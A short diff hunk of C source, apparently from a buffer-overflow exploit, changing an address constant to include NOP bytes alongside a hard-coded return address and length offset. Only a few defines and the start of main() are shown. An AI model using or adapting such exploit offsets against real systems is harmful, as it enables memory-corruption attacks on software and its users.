@@ -14,7 +14,7 @@
 #define NOP 0x90
 #define RETURN_ADDRESS "\x80\xfd\x21\x30"
 #define LEN_ADDRESS "\x1c\x01\x00\x00"
-#define I_ADDRESS "\x17\x01\x01\x01"
+#define I_ADDRESS "\x17\x01\x90\x90"
 
 int
 main ( int argc, char * argv[] )
